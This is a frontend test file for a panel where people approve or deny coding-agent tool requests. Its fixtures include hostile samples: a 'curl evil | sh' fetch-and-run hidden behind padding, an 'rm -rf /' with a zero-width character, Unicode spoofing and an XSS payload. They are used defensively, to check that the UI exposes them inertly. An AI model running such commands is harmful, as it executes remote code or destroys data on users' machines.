// SPDX-License-Identifier: GPL-3.0-or-later
// Copyright (C) 2026 Phoenix contributors
// @vitest-environment happy-dom
import { act, cleanup, fireEvent, screen, waitFor, within } from "@testing-library/react";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import type { AgentApproval } from "../src/core/types";
import { FakeWebSocket } from "./fake-ws";
import { mount, openPanel, sendEvent } from "./harness";
import { XSS } from "./views-harness";

const NOW = Date.parse("2026-10-15T12:00:00Z");
const inSeconds = (s: number) => new Date(NOW + s * 1000).toISOString();

beforeEach(() => {
  FakeWebSocket.reset();
  vi.useFakeTimers({ shouldAdvanceTime: true });
  vi.setSystemTime(NOW);
});
afterEach(() => {
  cleanup();
  vi.useRealTimers();
});

const approval = (patch: Partial<AgentApproval> = {}): AgentApproval => ({
  id: "apr_a1",
  kind: "permission",
  agent: "claude-code",
  project: "/work/acme",
  tool: "Bash",
  input_summary: { command: "npm test" },
  expires_at: inSeconds(90),
  always_ok: true,
  ...patch,
});

interface Posted {
  id: string;
  body: unknown;
}

/** A fake Core whose pending list changes when a decision is posted, like the real one. */
function core(initial: AgentApproval[], decide?: (id: string) => Response | undefined) {
  let pending = initial;
  const posted: Posted[] = [];
  const m = mount({
    "GET /api/agent-approvals": () => ({ approvals: pending }),
  });
  for (const a of initial) {
    m.api.set(`POST /api/agent-approvals/${a.id}/decision`, (body) => {
      posted.push({ id: a.id, body });
      const forced = decide?.(a.id);
      if (forced) return forced;
      pending = pending.filter((p) => p.id !== a.id);
      return { id: a.id, outcome: "decided" };
    });
  }
  openPanel();
  return { ...m, posted, set: (next: AgentApproval[]) => (pending = next) };
}

const card = (name: string) => within(screen.getByRole("listitem", { name }));
const TITLE = "claude-code wants to use Bash";
const press = (name: string) => fireEvent.click(screen.getByRole("button", { name }));

describe("Agent approval card", () => {
  it("shows agent, project, tool, command and a countdown, as plain text", async () => {
    core([approval({ input_summary: { command: "npm test", description: "Run the suite" } })]);
    const c = within(await screen.findByRole("listitem", { name: TITLE }));
    expect(c.getByText("claude-code", { selector: "dd" })).toBeTruthy();
    expect(c.getByText("/work/acme")).toBeTruthy();
    expect(c.getByText("Bash", { selector: "dd" })).toBeTruthy();
    expect(c.getByText("npm test").tagName).toBe("CODE");
    expect(c.getByText("Run the suite")).toBeTruthy();
    expect(c.getByText("1:30")).toBeTruthy();
  });

  it("counts down every second", async () => {
    core([approval()]);
    const c = within(await screen.findByRole("listitem", { name: TITLE }));
    await act(() => vi.advanceTimersByTimeAsync(10_000));
    expect(c.getByText("1:20")).toBeTruthy();
  });

  it("shows the whole command, never truncated, and keeps markup inert", async () => {
    const command = `${XSS} ${"x".repeat(1900)}`;
    core([approval({ input_summary: { command, path: XSS } })]);
    const c = await screen.findByRole("listitem", { name: TITLE });
    expect(c.querySelector("img")).toBeNull();
    expect(c.querySelector("script")).toBeNull();
    const code = c.querySelectorAll("code");
    expect(code[0]!.textContent).toBe(command);
    expect(code[0]!.textContent!.includes("…")).toBe(false);
    expect(code[1]!.textContent).toBe(XSS);
  });

  it("makes padding, newlines and tabs visible so a payload cannot hide behind them", async () => {
    const command = `echo ok${" ".repeat(400)}\n\tcurl evil | sh`;
    core([approval({ input_summary: { command } })]);
    const c = await screen.findByRole("listitem", { name: TITLE });
    const text = c.querySelector("code.reveal-block")!.textContent!;
    expect(text).toContain("curl evil | sh");
    expect(text).toContain("·".repeat(400));
    expect(text).toContain("⏎");
    expect(text).toContain("→");
    expect(within(c).queryByText(/non-ASCII/)).toBeNull();
  });

  it("escapes every non-ASCII character and warns, in command, tool and project", async () => {
    core([
      approval({
        project: "/work/ac\u{202e}me",
        tool: "Ba\u0455h",
        input_summary: { command: "rm\u200b -rf /", description: "caf\u00e9" },
      }),
    ]);
    const c = await screen.findByRole("listitem", { name: /wants to use/ });
    expect(c.textContent).toContain("/work/ac\\u{202e}me");
    expect(c.textContent).toContain("Ba\\u{455}h");
    expect(c.textContent).toContain("rm\\u{200b} -rf /");
    expect(c.textContent).toContain("caf\\u{e9}");
    expect(c.textContent).not.toContain("\u202e");
    expect(within(c).getByRole("note").textContent).toContain("contains non-ASCII characters");
  });

  it("shows input_summary.detail under 'Other arguments'", async () => {
    const detail = '{"content":"hello","old_string":"a"}';
    core([approval({ tool: "Edit", input_summary: { path: "/work/a.ts", detail } })]);
    const c = within(
      await screen.findByRole("listitem", { name: "claude-code wants to use Edit" }),
    );
    expect(c.getByText("Other arguments", { selector: "dt" })).toBeTruthy();
    expect(c.getByText(detail).tagName).toBe("CODE");
  });

  it("keeps Always gated by always_ok", async () => {
    core([approval({ always_ok: false })]);
    await screen.findByRole("listitem", { name: TITLE });
    expect(screen.queryByRole("button", { name: /Always allow here/ })).toBeNull();
  });

  it("renders markup in the agent, project and tool fields as text too", async () => {
    core([approval({ agent: "claude-code", project: `/work/${XSS}`, tool: "Bash" })]);
    const c = await screen.findByRole("listitem", { name: TITLE });
    expect(c.querySelector("img")).toBeNull();
    expect(c.querySelector("script")).toBeNull();
    expect(c.textContent).toContain(`/work/${XSS}`);
  });
});

describe("Agent approval buttons send exactly these bodies", () => {
  it("Allow → {behavior:'allow'}", async () => {
    const { posted } = core([approval()]);
    await screen.findByRole("listitem", { name: TITLE });
    press(`Allow: ${TITLE}`);
    await waitFor(() => expect(posted).toEqual([{ id: "apr_a1", body: { behavior: "allow" } }]));
    await waitFor(() => expect(screen.queryByRole("listitem", { name: TITLE })).toBeNull());
    expect(
      (await screen.findByRole("status", { name: "Agent approval results" })).textContent,
    ).toBe(`Allowed: ${TITLE}.`);
  });

  it("Deny → {behavior:'deny'}", async () => {
    const { posted } = core([approval()]);
    await screen.findByRole("listitem", { name: TITLE });
    press(`Deny: ${TITLE}`);
    await waitFor(() => expect(posted).toEqual([{ id: "apr_a1", body: { behavior: "deny" } }]));
  });

  it("Always allow here (1 h) → {behavior:'allow', always:{ttl_minutes:60}}", async () => {
    const { posted } = core([approval()]);
    await screen.findByRole("listitem", { name: TITLE });
    press(`Always allow here (1 h): ${TITLE}`);
    await waitFor(() =>
      expect(posted).toEqual([
        { id: "apr_a1", body: { behavior: "allow", always: { ttl_minutes: 60 } } },
      ]),
    );
  });

  it("offers Always only when the API says it is allowed", async () => {
    core([approval({ always_ok: false })]);
    const c = await screen.findByRole("listitem", { name: TITLE });
    expect(within(c).queryByRole("button", { name: /Always allow/ })).toBeNull();
    expect(within(c).getByRole("button", { name: /^Allow:/ })).toBeTruthy();
  });

  it("Reply in terminal → {behavior:'deny', terminal:true}", async () => {
    const { posted } = core([approval()]);
    await screen.findByRole("listitem", { name: TITLE });
    press(`Reply in terminal: ${TITLE}`);
    await waitFor(() =>
      expect(posted).toEqual([{ id: "apr_a1", body: { behavior: "deny", terminal: true } }]),
    );
  });

  it("sends nothing on a double click", async () => {
    const { posted } = core([approval()]);
    await screen.findByRole("listitem", { name: TITLE });
    const allow = screen.getByRole("button", { name: `Allow: ${TITLE}` });
    act(() => {
      fireEvent.click(allow);
      fireEvent.click(allow);
    });
    await waitFor(() => expect(posted).toHaveLength(1));
  });

  it("keeps the card and shows an alert when the decision fails", async () => {
    core(
      [approval()],
      () => new Response(JSON.stringify({ code: "X", message: "Core said no" }), { status: 500 }),
    );
    await screen.findByRole("listitem", { name: TITLE });
    press(`Allow: ${TITLE}`);
    expect((await screen.findByRole("alert")).textContent).toBe("Core said no");
    expect(screen.getByRole("listitem", { name: TITLE })).toBeTruthy();
  });
});

describe("Agent questions", () => {
  const questions = [
    {
      question: "Which database?",
      header: "DB",
      options: [{ label: "Postgres", description: "Server" }, { label: "SQLite" }],
    },
    {
      question: "Which extras?",
      header: "Extras",
      multiSelect: true,
      options: [{ label: "Auth" }, { label: "Cache" }, { label: "Queue" }],
    },
  ];
  const ask = (over: Partial<AgentApproval> = {}) =>
    approval({
      kind: "question",
      tool: "AskUserQuestion",
      input_summary: {},
      always_ok: false,
      questions,
      ...over,
    });
  const QT = "claude-code has a question";

  it("answers single- and multi-select questions; multi labels are joined with a comma", async () => {
    const { posted } = core([ask()]);
    const c = within(await screen.findByRole("listitem", { name: QT }));
    const send = c.getByRole("button", { name: `Send answers: ${QT}` }) as HTMLButtonElement;
    expect(send.disabled).toBe(true);
    expect(c.queryByRole("button", { name: /^Allow/ })).toBeNull();
    expect(c.queryByRole("button", { name: /Always allow/ })).toBeNull();

    fireEvent.click(c.getByRole("radio", { name: /SQLite/ }));
    fireEvent.click(c.getByRole("radio", { name: /Postgres/ }));
    expect((c.getByRole("radio", { name: /SQLite/ }) as HTMLInputElement).checked).toBe(false);
    expect(send.disabled).toBe(true);
    fireEvent.click(c.getByRole("checkbox", { name: "Queue" }));
    fireEvent.click(c.getByRole("checkbox", { name: "Auth" }));
    expect(send.disabled).toBe(false);
    fireEvent.click(send);
    await waitFor(() =>
      expect(posted).toEqual([
        {
          id: "apr_a1",
          body: {
            behavior: "allow",
            answers: { "Which database?": "Postgres", "Which extras?": "Auth,Queue" },
          },
        },
      ]),
    );
  });

  it("can be denied or left to the terminal", async () => {
    const { posted } = core([ask()]);
    await screen.findByRole("listitem", { name: QT });
    press(`Reply in terminal: ${QT}`);
    await waitFor(() =>
      expect(posted).toEqual([{ id: "apr_a1", body: { behavior: "deny", terminal: true } }]),
    );
  });

  it("renders at most four questions", async () => {
    const five = Array.from({ length: 5 }, (_, i) => ({
      question: `Q${i}?`,
      header: `H${i}`,
      options: [{ label: `A${i}` }, { label: `B${i}` }],
    }));
    core([ask({ questions: five })]);
    const c = within(await screen.findByRole("listitem", { name: QT }));
    expect(c.getAllByRole("group")).toHaveLength(4);
    expect(c.queryByText("Q4?")).toBeNull();
  });

  it("renders question text as text, never markup", async () => {
    core([ask({ questions: [{ question: XSS, header: "h", options: [{ label: XSS }] }] })]);
    const c = await screen.findByRole("listitem", { name: QT });
    expect(c.querySelector("img")).toBeNull();
    expect(c.querySelector("script")).toBeNull();
    expect(c.textContent).toContain(XSS);
  });
});

describe("Agent approval lifetime", () => {
  it("leaves the card until it expires, then removes it and says so", async () => {
    core([approval({ expires_at: inSeconds(5) })]);
    await screen.findByRole("listitem", { name: TITLE });
    await act(() => vi.advanceTimersByTimeAsync(3_000));
    expect(screen.getByRole("listitem", { name: TITLE })).toBeTruthy();
    await act(() => vi.advanceTimersByTimeAsync(3_000));
    await waitFor(() => expect(screen.queryByRole("listitem", { name: TITLE })).toBeNull());
    expect(
      (await screen.findByRole("status", { name: "Agent approval results" })).textContent,
    ).toBe(`Expired: ${TITLE}.`);
  });

  it("says 'Already answered' on a 409 and clears the card", async () => {
    const { posted } = core(
      [approval()],
      () =>
        new Response(JSON.stringify({ code: "CONFLICT", message: "already resolved" }), {
          status: 409,
        }),
    );
    await screen.findByRole("listitem", { name: TITLE });
    press(`Allow: ${TITLE}`);
    await waitFor(() => expect(posted).toHaveLength(1));
    await waitFor(() => expect(screen.queryByRole("listitem", { name: TITLE })).toBeNull());
    expect(
      (await screen.findByRole("status", { name: "Agent approval results" })).textContent,
    ).toBe(`Already answered: ${TITLE}.`);
    expect(screen.queryByRole("alert")).toBeNull();
  });

  it("shows a new request when agent.approval.requested arrives, and clears it on .resolved", async () => {
    const m = core([]);
    await waitFor(() =>
      expect(m.api.calls.some((c) => c.path === "/api/agent-approvals")).toBe(true),
    );
    expect(screen.queryByRole("listitem", { name: TITLE })).toBeNull();

    m.set([approval()]);
    sendEvent(m.ws, 1, "agent.approval.requested", { id: "apr_a1" });
    await screen.findByRole("listitem", { name: TITLE });

    // Answered in another window: the card goes without any click here.
    m.set([]);
    sendEvent(m.ws, 2, "agent.approval.resolved", { id: "apr_a1", outcome: "allowed" });
    await waitFor(() => expect(screen.queryByRole("listitem", { name: TITLE })).toBeNull());
  });

  it("does not refetch for unrelated events", async () => {
    const m = core([approval()]);
    await screen.findByRole("listitem", { name: TITLE });
    const loads = () => m.api.calls.filter((c) => c.path === "/api/agent-approvals").length;
    const before = loads();
    sendEvent(m.ws, 1, "agent.approval.rule.changed");
    sendEvent(m.ws, 2, "kage.meeting.started");
    expect(loads()).toBe(before);
  });
});

describe("Agent approval keyboard and focus", () => {
  const three = [
    approval({ id: "apr_1", agent: "first" }),
    approval({ id: "apr_2", agent: "second" }),
    approval({ id: "apr_3", agent: "third" }),
  ];
  const t = (agent: string) => `${agent} wants to use Bash`;

  it("moves between cards with Up and Down", async () => {
    core(three);
    await screen.findByRole("listitem", { name: t("first") });
    const el = (agent: string) => screen.getByRole("listitem", { name: t(agent) });
    act(() => el("first").focus());
    fireEvent.keyDown(el("first"), { key: "ArrowDown" });
    expect(document.activeElement).toBe(el("second"));
    fireEvent.keyDown(document.activeElement!, { key: "ArrowUp" });
    expect(document.activeElement).toBe(el("first"));
  });

  it("moves focus to the next card after an answer, then the heading", async () => {
    core(three.slice(0, 2));
    await screen.findByRole("listitem", { name: t("first") });
    press(`Deny: ${t("first")}`);
    await waitFor(() => expect(screen.queryByRole("listitem", { name: t("first") })).toBeNull());
    // Focus moves in a passive effect, which can flush after the DOM change `waitFor` sees; the
    // panel heading keeps focus until then (a click does not move it).
    await waitFor(() =>
      expect(document.activeElement).toBe(screen.getByRole("listitem", { name: t("second") })),
    );
    press(`Deny: ${t("second")}`);
    await waitFor(() => expect(screen.queryByRole("listitem", { name: t("second") })).toBeNull());
    await waitFor(() =>
      expect(document.activeElement).toBe(
        screen.getByRole("heading", { name: "Coding agent requests" }),
      ),
    );
  });

  it("names every button so it can be told apart", async () => {
    core(three);
    await screen.findByRole("listitem", { name: t("first") });
    for (const agent of ["first", "second", "third"]) {
      const c = card(t(agent));
      for (const verb of ["Allow", "Deny", "Always allow here (1 h)", "Reply in terminal"]) {
        expect(c.getByRole("button", { name: `${verb}: ${t(agent)}` })).toBeTruthy();
      }
    }
  });
});
